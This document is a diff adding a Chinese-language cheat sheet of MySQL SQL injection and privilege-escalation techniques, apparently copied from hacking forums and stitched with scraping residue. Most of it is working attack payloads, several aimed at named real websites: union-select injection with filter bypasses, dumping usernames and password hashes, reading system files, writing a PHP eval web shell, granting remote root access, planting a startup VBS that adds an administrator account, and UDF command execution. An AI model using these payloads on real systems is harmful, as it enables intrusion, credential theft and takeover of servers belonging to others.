@@ -1,0 +1,243 @@
+饶过union select 注入
+http://cleopatra-sy.com/index.php?content=more_product&id=-17  and  (select  1)=(select 0xAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA)+/*!union*/+select+1,2,3,4,5,6--
+
+
+开启外连：
+GRANT ALL PRIVILEGES ON	*.* TO 'root'@'%' IDENTIFIED BY 'hacker' WITH GRANT OPTION;
+
+
+回复 1# ayhRh 
+# }9 c! Y; r2 t: [' Bwww.90sec.org可以尝试把mysql的user文件拷贝到本地获取root账户密码 - 专注Web信息安全- n' S4 a: n. D' Z* K
+90sec-Web信息安全团队! z+ w$ y/ p  R, o
+以下来源：http://zhidao.baidu.com/question/150816924.html
+- f/ n! ^6 \8 e; ~# C' B0 b+ o) P90 Security Team关闭MySQL，Windows下打开Mysql\data\mysql，有三个文件user.frm,user.MYD,user.MYI找个知道密码的MySQL，替换相应的这三个文件，如果user表结构没改过，一般也没人去改，替换user.MYD就可以了。 
+( L/ Z; [( ?; S1 A: i90sec-Web信息安全团队
+  i- o7 \* p% l3 ]9 u - 专注Web信息安全也可以直接编辑Mysql\data\mysql\user.MYD，找个十六进制编辑器，UltraEdit就有这个功能。关闭MySQL，打开user.MYD。将用户名root后面的八个字符改为565491d704013245，新密码就是123456。或者将它们对应的十六进制数字，（左边那里，一个字符对应两个数字），改为 00 02 02 02 02 02 02 02,这就是空密码，在编辑器右边看到的都是星号*，看起来很象小数点。重开MySQL，输入root和你的新密码。 
+
+
+
+CONVERT(group_concat(DISTINCT+user,0x3a,password,0x3a,host)+USING+latin1)
+
+虽然能load_file加载文件，但是似乎用处不大。非也非也，既然是IIS6，那么加载c:\\windows\\system32\\inetsrv\\MetaBase.xml这个路径就可以获取网站配置信息了
+
+
+mysql -h localhost -u root -p
+select version(),user(),database();
+use information_schema;
+show tables;
+select * from information_schema.SCHEMATA;
+select schema_name from information_schema.SCHEMATA limit 1,1;
+select table_name from information_schema.TABLES where TABLE_SCHEMA=0x31366B63 limit 1,1;
+select COLUMN_NAME from information_schema.COLUMNS where TABLE_NAME=0x6364625F6D656D62657273 limit 1,1;
+select username,password from 16kc.cdb_members;
+
+1、连接到对方MYSQL 服务器
+　　mysql -u root -h 192.168.0.1
+　　mysql.exe 这个程序在你安装了MYSQL的的BIN目录中
+　　2、让我们来看看服务器中有些什么数据库
+　　mysql>show databases;
+　　MYSQL默认安装时会有MYSQL、TEST这两个数据库，如果你看到有其它的数据库那么就是用户自建的数据库。
+　　3、让我们进入数据库
+　　mysql>use test;
+　　我们将会进入test数据库中
+　　4、查看我们进入数据库中有些什么数据表
+　　mysql>show tables;
+　　默认的情况下，test中没有任何表的存在。
+　　以下为关键的部分
+　　5、在TEST数据库下创建一个新的表；
+　　mysql>create table a (cmd text);
+　　好了，我们创建了一个新的表，表名为a，表中只存放一个字段，字段名为cmd，为text文本。
+　　6、在表中插入内容
+　　mysql>insert into a values ("set wshshell=createobject (""wscript.shell"" ) " );
+　　mysql>insert into a values ("a=wshshell.run (""cmd.exe /c net user 1 1/add"",0) " );
+　　mysql>insert into a values ("b=wshshell.run (""cmd.exe /c net localgroup Administrators 1 /add"",0) " );
+　　注意双引号和括号以及后面的“0”一定要输入！我们将用这三条命令来建立一个VBS的脚本程序！
+　　7、好了，现在我们来看看表a中有些什么
+　　mysql>select * from a;
+　　我们将会看到表中有三行数据，就是我们刚刚输入的内容，确认你输入的内容无误后，我们来到下一步
+　　8、输出表为一个VBS的脚本文件
+　　mysql>select * from a into outfile "c:\\docume~1\\alluse~1\\「开始」菜单\\程序\\启动\\a.vbs";
+　　我们把我们表中的内容输入到启动组中，是一个VBS的脚本文件！注意“"符号。
+　　9、看到这大家肯定知道了，就是利用MYSQL输出一个可执行的文件而已。
+　　为什么不用BAT呢，因为启动运行时会有明显的DOS窗口出来，而用VBS脚本则可以完全隐藏窗口且不会有错误提示！本来，应该还有一句完成脚本后自动删除此脚本的，但是中文目录实在无法处理，只有作罢！好了，找个
+工具攻击135让服务器重启吧，几分钟以后你就是管理员了。
+
+
+
+1 判断：and 1=1 and 1=2
+
+2  爆字段数 order by x
+  and char(0x49)=unhex(hex(char(0x49))) and 1%3C2
+ and 1=2 union select 0,unhex(hex(concat(0x5e5e5e,database(),0x5e5e5e))),0,0,0,0,0,0 -- 
+
+/home/aftagr/public_html/chinese/code/functions.php
+
+GET /details.php?p_id=627 and 1=2 union select 0x5e5e5e6161615e5e5e/* and 1=1 HTTP/1.1
+
+GET /details.php?p_id=627 and 1=2 union select char(97,98,97,98,97,97,97,98,98,98,97,99,97)-- HTTP/1.1
+
+GET /details.php?p_id=627 and 1=2 union select 'aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa'-- HTTP/1.1
+
+GET /details.php?p_id=627 and 1=2 union select concat(char(94),char(94),char(94),database(),char(94),char(94),char(94)) -- HTTP/1.1
+
+GET /details.php?p_id=627 /*!39999 and 1=2*/-- HTTP/1.1
+
+3  and 1=2 union select 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16
+
+操作系统信息：
+
+and 1=2 union all select @@global.version_compile_os from mysql.user /*
+
+数据库权限：
+
+and ord(mid(user(),1,1))=114 /* 返回正常说明为root
+
+4 查用户版本裤名：user(),version(),database() 如：爆出2,5,6
+  
+  and 1=2 union select 1,user(),3,4,version(),database(),7,8,9,10,11,12,13,14,15,16
+
+或: and 1=2 union select 1,2,3,CONCAT_WS(CHAR(32,58,32),user(),database(),version()),5,6,7,8/*
+判断有几个库：
+    and 1=2+union+select+1,2,concat(version(),0x3a,database(),0x3a,user()),4,5
+english/newsview.php?id=746 and 1=2 union select 0,concat(char(94),char(94),char(94),count(*),char(94),char(94),char(94)),0,0,0,0,0,0,0,0 from (select * from information_schema.tables group by table_schema order by table_schema)t limit 1/* and 1=1
+
+逐条爆库：
+english/newsview.php?id=746 and 1=2 union select 0,concat(char(94),char(94),char(94),table_schema,char(94),char(94),char(94)),0,0,0,0,0,0,0,0 from (select * from (select * from information_schema.tables group by table_schema order by table_schema limit 0,1) t order by table_schema desc)t limit 1/* and 1=1
+
+5   爆所有数据裤：     group_concat只能在5。0以上版本用
+
+    and 1=2 union select 1,group_concat(schema_name) ,3,user(),load_file(char(99,58,92,98,111,111,116,46,105,110,105)),6,7,8,9,10,11 from information_schema.schemata--
+
+6   爆所有表名:
+
+    and 1=2 union select 1,group_concat(table_name) ,3,user(),load_file(char(99,58,92,98,111,111,116,46,105,110,105)),6,7,8,9,10,11 from information_schema.tables where table_schema=database()--
+
+7   爆所有列名:
+
+    and 1=2 union select 1,group_concat(column_name) ,3,user(),load_file(char(99,58,92,98,111,111,116,46,105,110,105)),6,7,8,9,10,11 from information_schema.columns where table_name=0x636F--  表名的16进制
+
+8   5.0以下爆裤表及列用法:
+
+    爆数据裤：
+
+    and 1=2 union select 1,schema_name,3,4,5,6,7,8,9,10 from information_schema.SCHEMATA limit 0,1/*
+
+    爆表名:
+
+    and 1=2 union select 1,2,3,4,table_name,6,7,8,9,10 from information_schema.tables where TABLE_SCHEMA=0x686273746172735F636D73 limit 0,1/*  0x63636d74裤名的16进制
+
+    爆列名:
+
+    and 1=2 union select 1,COLUMN_NAME,3,4,5,6,7,8,9,10 from information_schema.COLUMNS where TABLE_NAME=0x61666669636865 limit 0,1/*  这里 0x61666669636865 是0x+表名的十六进制
+
+暴库 (mysql>5.0)
+
+Mysql 5 以上有内置库 information_schema，存储着mysql的所有数据库和表结构信息
+
+and 1=2 union select 1,2,3,SCHEMA_NAME,5,6,7,8,9,10 from information_schema.SCHEMATA limit 0,1 
+
+猜表
+
+and 1=2 union select 1,2,3,TABLE_NAME,5,6,7,8,9,10 from information_schema.TABLES where TABLE_SCHEMA=数据库（十六进制） limit 0（开始的记录，0为第一个开始记录）,1（显示1条记录）--
+
+猜字段
+
+and 1=2 Union select 1,2,3,COLUMN_NAME,5,6,7,8,9,10 from information_schema.COLUMNS where TABLE_NAME=表名（十六进制）limit 0,1
+
+暴密码
+
+and 1=2 Union select 1,2,3,用户名段,5,6,7,密码段,8,9 from 表名 limit 0,1
+
+高级用法（一个可用字段显示两个数据内容）：
+
+and 1=2 Union select 1,2,3concat(用户名段,0x3c,密码段),5,6,7,8,9 from 表名 limit 0,1
+
+9 读C:\boot.ini文件  当然也可以读目录 /c:\/
+
+  譬如你读出来的内容如果含有<>等符号,那么浏览器就会执行你的文件内容,你自然什么都看不到.对付这样的情况
+
+  
+  replace(load_file(A)),char(B),char(C))
+
+  and 1=2 union select 1,2,3,4,replace(load_file(char(99,58,92,98,111,111,116,46,105,110,105)),char(60),char(32)),6,7,8,9,10,11,12,13,14--
+
+  或：and 1=2 union select 1,2,3,4,replace(load_file(0x433A5C626F6F742E696E69),char(60),char(32)),6,7,8,9,10,11,12,13,14--
+
+  2: 所有的字段位置都不够位置回显,读到的文件不完整,Substring(str,pos,len)函数解决问题.他的意思是从字符串str的pos位位置起返回len个字符的子串.
+
+   譬如Substring(load_file(A),50,100)就是把A的内容的第50个字母开始回显100个给你.那么就能逐段逐段的回显啦.
+ 
+   and 1=2 union select 1,2,3,4,Substring(load_file(char(99,58,92,98,111,111,116,46,105,110,105)),50,100),6,7,8,9,10,11,12,13,14--
+
+10 直接写马(Root权限) 
+
+  条件：1、知道站点物理路径
+
+        2、有足够大的权限（and (select count(*) from mysql.user)>0）
+
+        3、magic_quotes_gpc()=OFF
+
+        select ‘<?php eval($_POST[cmd])?>' into outfile ‘物理路径'
+
+        and 1=2 union all select 一句话HEX值 into outfile '路径'
+
+
+
+ /product.php?id=66 and 1=2 union select 0,0,concat(char(13),char(10),char(97),char(97),char(97)),0,0,0,0,0 into dumpfile 'e:%5C%5Cweb%5C%5Cbaoj%5C%5Cgo.php'/* and 1=1
+
+
+
+
+
+
+
+手工注射时出现的问题：
+
+当注射后页面显示：
+
+Illegal mix of collations (latin1_swedish_ci,IMPLICIT) and (utf8_general_ci,IMPLICIT) for operation 'UNION'
+
+如：http://www.mse.tsinghua.edu.cn/mse/research/instrument.php?ID=13 and 1=2 union select 1,load_file(0x433A5C626F6F742E696E69),3,4,user() 
+
+这是由于前后编码不一致造成的，
+
+解决方法：在参数前加上 unhex(hex(参数))就可以了。上面的URL就可以改为：
+
+http://www.mse.tsinghua.edu.cn/mse/research/instrument.php?ID=13 and 1=2 union select 1,unhex(hex(load_file(0x433A5C626F6F742E696E69))),3,4,unhex(hex(user()))  
+
+
+对于can't open shared library 'udf.dll'相信很多使用mysql提权的朋友应该都不会感到陌生吧，明明是root用户 但是在使用udf.dll提权创建自定义函数时却提示这样的错误，以前遇到这种情况一般都会放弃。 
+
+ 
+经过测试发现appserv搭建php环境能利用udf.dll提权 5.037
+ 
+apache+php+mysql+phpmyadmin搭建的php环境不能利用 5.1
+ 
+为什么两个系统一个能利用一个不能利用呢？原因很简单 因为 5.1版本开始必须把udf.dll文件放到mysql安装目录下的lib/blugin文件下才能创建自定义函数，并且该目录默认是没有的，而mysql into dumpfile在导出文件时也不能创建文件夹，原来mysql从5.1版本开始在把udf.dll导入到系统目录下已经不能创建自定义函数了，而一般我们都是把udf.dll导入到系统目录，自然也就不能创建自定义函数了，导致了不能提权。能够提权的系统中的mysql版本为5.0.37，不能提权的系统中的mysql的版本为5.1正好符合上面说法。
+ 
+在不能利用的系统（5.037)中执行create function mycmd return string soname 'udf.dll' 时提示can't open shared library 'udf.dll' 的错误提示，说明导出到系统目录不能创建自定义函数，我们来把udf.dll导入到mysql安装目录下的lib/blugin目录中，我已经知道了mysql的安装目录为:"c:\program files\mysql\mysql server 5.1"在这个目录下目前还没有lin/plugin这个目录，我们通过webshell在mysql安装目录下创建lib文件夹然后再lib文件夹中创建plugin文件夹 在udf.php中dll导出路径就写"c:\program files\mysql\mysql server 5.1\lib\plugin\udf.dll"。这时候就可以执行 如select mycmd("net user")；的sql命令来执行聪明的了。。。
+ 
+通过在mysql安装目录下创建lib/plugin目录，然后再把udf.dll文件导出到该目录下，是在mysql 5.1以及更高版本中解决"can't open shared library 'udf.dll'"错误的一种办法。。。。
+
+
+
+
+
+
+
+
+详细出处参考：http://www.jb51.net/article/20675.htm
+
+
+
+
+
+
+
+
+
+
+
+
+
+
